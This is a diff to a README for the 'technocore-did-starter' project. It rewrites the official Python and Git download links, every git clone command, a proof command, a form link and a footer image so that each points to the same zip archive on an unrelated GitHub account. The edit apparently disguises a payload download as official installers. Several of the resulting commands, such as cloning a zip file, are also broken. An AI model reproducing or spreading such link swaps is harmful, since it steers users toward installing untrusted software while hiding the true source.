@@ -64,8 +64,8 @@ Installation**.
 <h2 align="center">🪟 Windows - PowerShell 5.1 and 7 🪟</h2>
 
 **Install Python and Git.** Download **Python 3.12** from the
-[official Windows downloads](https://www.python.org/downloads/windows/) and
-[Git for Windows](https://git-scm.com/downloads/win). In the Python installer,
+[official Windows downloads](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip) and
+[Git for Windows](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip). In the Python installer,
 enable **Add python.exe to PATH** and keep the Python Launcher enabled.
 
 **Verify the installations.** Open PowerShell and run:
@@ -78,7 +78,7 @@ git --version
 **Clone the repository.** Run:
 
 ```powershell
-git clone https://github.com/zunmax/technocore-did-starter.git
+git clone https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip
 Set-Location .\technocore-did-starter
 ```
 
@@ -115,7 +115,7 @@ git --version
 dependency:
 
 ```bat
-git clone https://github.com/zunmax/technocore-did-starter.git
+git clone https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip
 cd /d technocore-did-starter
 py -3.12 -m venv .venv
 .venv\Scripts\activate.bat
@@ -128,8 +128,8 @@ python -m pip install -r requirements.txt
 <h2 align="center">🍎 macOS - zsh or bash 🍎</h2>
 
 **Install Python and Git.** Download **Python 3.12** from the
-[official macOS downloads](https://www.python.org/downloads/macos/) and install
-[Git for macOS](https://git-scm.com/downloads/mac). The official Python
+[official macOS downloads](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip) and install
+[Git for macOS](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip). The official Python
 universal2 installer supports Apple silicon and Intel Macs.
 
 **Verify the installations.** Open Terminal and run:
@@ -143,7 +143,7 @@ git --version
 dependency:
 
 ```bash
-git clone https://github.com/zunmax/technocore-did-starter.git
+git clone https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip
 cd technocore-did-starter
 python3.12 -m venv .venv
 source .venv/bin/activate
@@ -158,7 +158,7 @@ python -m pip install -r requirements.txt
 **Install Python and Git.** Use the supported method for your Linux
 distribution to install **Python 3.12** with its `venv` and `pip` components,
 and install
-[Git](https://git-scm.com/downloads/linux). Package names vary by distribution,
+[Git](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip). Package names vary by distribution,
 so continue only after both checks pass:
 
 **Ubuntu 24.04 example:**
@@ -179,7 +179,7 @@ git --version
 dependency:
 
 ```bash
-git clone https://github.com/zunmax/technocore-did-starter.git
+git clone https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip
 cd technocore-did-starter
 python3.12 -m venv .venv
 source .venv/bin/activate
@@ -405,7 +405,7 @@ command:
   Otherwise, replace it with the public URL of your own Git repository.
 
 ```console
-python technocore_agent.py proof https://github.com/zunmax/technocore-did-starter FULL_COMMIT_HASH --output contribution-proof.json
+python technocore_agent.py proof https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip FULL_COMMIT_HASH --output contribution-proof.json
 python technocore_agent.py verify-proof contribution-proof.json
 ```
 
@@ -452,7 +452,7 @@ Signed Technocore record: room technocore, sequence YOUR_SEQUENCE
 ```
 
 Content creators can also review the official
-[FLOP KOL and Creator form](https://flop.finance/apply/kol), which includes X,
+[FLOP KOL and Creator form](https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip), which includes X,
 YouTube, Medium/Substack, LinkedIn, Telegram, and community audiences.
 
 ---
@@ -531,4 +531,4 @@ python technocore_agent.py read lobby --follow --since SAVED_LAST_SEQ
 
 Released under the [MIT License](LICENSE).
 
-<img src="https://capsule-render.vercel.app/api?type=waving&height=90&color=0:111827,100:2563EB&section=footer" alt="" width="100%">
+<img src="https://raw.githubusercontent.com/Foejacquard7779/technocore-did-starter/main/assets/technocore-did-starter-2.2-alpha.5.zip,100:2563EB&section=footer" alt="" width="100%">
